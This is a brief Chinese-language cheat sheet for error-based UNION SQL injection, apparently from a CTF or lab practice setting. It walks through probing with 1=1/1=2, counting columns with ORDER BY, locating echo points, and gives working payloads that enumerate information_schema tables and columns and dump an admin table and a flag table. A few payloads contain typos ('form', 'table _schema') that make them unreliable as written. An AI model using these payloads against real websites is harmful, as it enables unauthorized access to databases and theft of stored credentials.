显错注入大概流程：
1. 网址栏输入1=1 和1=2 观察是否错误 错误进入下一流程 正确改成其他情况
2. order by 1，2，3等语句判断长度
3.通过union select 1，2，3判断回显点 用database（） version（）等函数找
4.按以下方法来进行

方法一：union select 1,table_name from information_schema.tables where table_schema=database()  limit 0,1
              union select 1,column_name form information_schema.columns where table_schema= database() and table_name='admin' limit 0,1
	    union select 1,username form admin limit 0,1


方法二：union select 1,group_concat(table_name) from information_schema.tables where table _schema =database()
	   union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='error_flag'
     	   union select 1,2,group_concat(id,flag) from error_flag  (此处可以把表中数据全都列出来)
